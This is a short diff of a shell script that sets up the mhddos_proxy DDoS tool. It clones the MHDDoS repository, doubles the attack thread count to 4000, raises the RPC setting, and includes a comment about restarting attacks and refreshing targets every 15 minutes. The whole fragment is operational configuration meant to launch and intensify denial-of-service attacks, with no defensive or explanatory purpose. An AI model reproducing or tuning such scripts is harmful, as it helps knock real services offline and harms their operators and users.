@@ -15,8 +15,8 @@ cd mhddos_proxy
 #curl -o proxies_config.json https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json 
 git clone https://github.com/MHProDev/MHDDoS.git
 
-threads="${1:-2000}"; threads="-t $threads"
-rpc="--rpc 3000"
+threads="${1:-4000}"; threads="-t $threads"
+rpc="--rpc 4000"
 debug="--debug"
 
 # Restart attacks and update targets every 15 minutes
